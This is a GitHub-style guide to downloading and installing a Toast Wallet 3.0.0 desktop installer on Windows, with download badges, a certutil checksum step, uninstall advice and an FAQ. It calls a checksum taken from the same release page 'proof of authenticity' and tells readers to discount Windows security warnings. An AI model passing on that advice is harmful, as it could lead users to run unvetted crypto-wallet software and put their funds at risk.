<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Install Toast Wallet on Windows</h1>

<p align="center">Download, check and install the Windows desktop wallet step by step.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Download `ToastWallet.Setup.3.0.0.exe` from the [Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), check its SHA-256 value, remove any older copy of the program, then run the installer and open Toast Wallet from the Start menu.

## 👀 You'll see this if

- You are installing Toast Wallet on a Windows PC for the first time.
- You have a new laptop and want the desktop wallet on it before restoring a backup.
- Someone sent you a "Toast Wallet download" link and you are not sure it is the real one.
- An older version is already installed and you want the current release instead.

## 🤔 Why it matters

Windows is the most common platform for Toast Wallet, which also makes it the main target for fake installers. Copies of wallet programs are regularly re-uploaded to file-sharing sites, advertising pages and look-alike domains with small changes that send your keys to someone else. The only way to be certain you have the genuine program is to take it from the official GitHub release and confirm that its checksum matches the one published there.

A clean installation also avoids a whole category of strange problems. When an old build sits next to a new one, shortcuts can open the wrong version, and the wallet may look as if it has lost data when it has simply opened an older copy. Taking a few minutes to remove the previous program first saves a lot of confusion later.

## 🛠️ Fix: install step by step

1. **Open the official release.** Go to the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) on GitHub. Scroll to the Assets list near the bottom of the page.
2. **Download the Windows file.** Click `ToastWallet.Setup.3.0.0.exe`. Your browser normally saves it to your Downloads folder. Do not rename the file, because the name helps you match it with the checksum table.
3. **Check the fingerprint.** Open PowerShell (press the Windows key, type PowerShell, press Enter) and run:
   ```powershell
   certutil -hashfile "$env:USERPROFILE\Downloads\ToastWallet.Setup.3.0.0.exe" SHA256
   ```
   Compare the long result with the Windows value in the checksum table of the release. Every character has to match. The full method is in [verify a Toast Wallet download checksum](https://github.com/Toast-Wallet/learn/blob/main/how-to/verify-toast-wallet-download-checksum.md).
4. **Keep your backup safe.** If you already use Toast Wallet on this computer, make sure you have a current backup code written down, plus your passphrase. The guide [create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md) shows how.
5. **Remove the old program.** Open Settings, then Apps, then Installed apps. Find Toast Wallet, choose the three-dot menu and select Uninstall. This removes the program only. Your XRP lives on the XRP Ledger, not inside the program files. More detail is in [uninstall an old Toast Wallet version](https://github.com/Toast-Wallet/learn/blob/main/how-to/uninstall-old-toast-wallet-version.md).
6. **Run the installer.** Double-click the downloaded file. Follow the prompts until the installer finishes.
7. **Open Toast Wallet.** Start it from the Start menu. If your wallet data from before is still on the computer, the app opens it. Otherwise you are offered the choice to create a new wallet or restore an existing one.
8. **Finish your task.** Continue with [Toast Wallet first-time setup](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-first-time-setup.md) for a new wallet, or restore your backup if you are moving from another computer.

## 🔁 If that did not work

- **The checksum does not match.** Delete the file and download it again directly from the release page. A partial download or a file from a different source will produce a different value. Never run a file that fails this check.
- **Windows shows a blue warning screen.** Read [Toast Wallet Windows security warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-windows-security-warning.md) before deciding anything. The checksum is your proof of authenticity, not the warning text.
- **The installer closes immediately.** Restart Windows, make sure no other copy of Toast Wallet is running, and try again with the file from your Downloads folder rather than from inside a zip or a cloud folder.
- **The app opens but looks empty.** An empty wallet usually means the data from your old installation is not on this computer. Restore with your backup code rather than creating a new wallet over it.

## 🛡️ Prevention

Bookmark the official release page and use only that bookmark for future downloads. Search results and adverts can point to copies that look identical. Keep one installation of Toast Wallet per computer, and every time a new release appears, remove the old program before installing the new one. Write your backup code on paper and store it away from the computer, so a disk failure never decides what happens to your XRP.

It also helps to keep a short note, separate from your secrets, that records which version you installed and when. That way, if something looks different after an update, you know immediately whether the change came from the new release or from somewhere else.

## ❓ FAQ

<details>
<summary>Do I need to pay for Toast Wallet?</summary>

No. The installer on the official release page is free. Any site asking for payment to download Toast Wallet is not the official source.

</details>

<details>
<summary>Will uninstalling delete my XRP?</summary>

No. XRP is recorded on the XRP Ledger. What you must protect is your backup code and passphrase, because they let you open your accounts again in any installation.

</details>

<details>
<summary>Can I install it on a work computer?</summary>

You can, but a personal computer that only you control is a better place for a wallet. Work devices may be monitored or wiped without notice.

</details>

<details>
<summary>Where do I report a problem with the installer?</summary>

Open an issue in the [Toast Wallet app repository](https://github.com/Toast-Wallet/core) and describe what you saw, without including any recovery words, passphrase or backup code.

</details>

> [!WARNING]
> Never type your recovery words, passphrase or backup code into a website, and never send them to anyone who offers to help with installation.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Verify a Toast Wallet download checksum](https://github.com/Toast-Wallet/learn/blob/main/how-to/verify-toast-wallet-download-checksum.md) | Compare SHA-256 values so you know the installer is the real one. |
| [Toast Wallet first-time setup](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-first-time-setup.md) | Create your PIN, passphrase, recovery words and first backup. |
| [Uninstall an old Toast Wallet version](https://github.com/Toast-Wallet/learn/blob/main/how-to/uninstall-old-toast-wallet-version.md) | Remove an outdated program safely without losing access to your XRP. |
| [Toast Wallet Windows security warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-windows-security-warning.md) | What a Windows warning means and how to decide safely. |
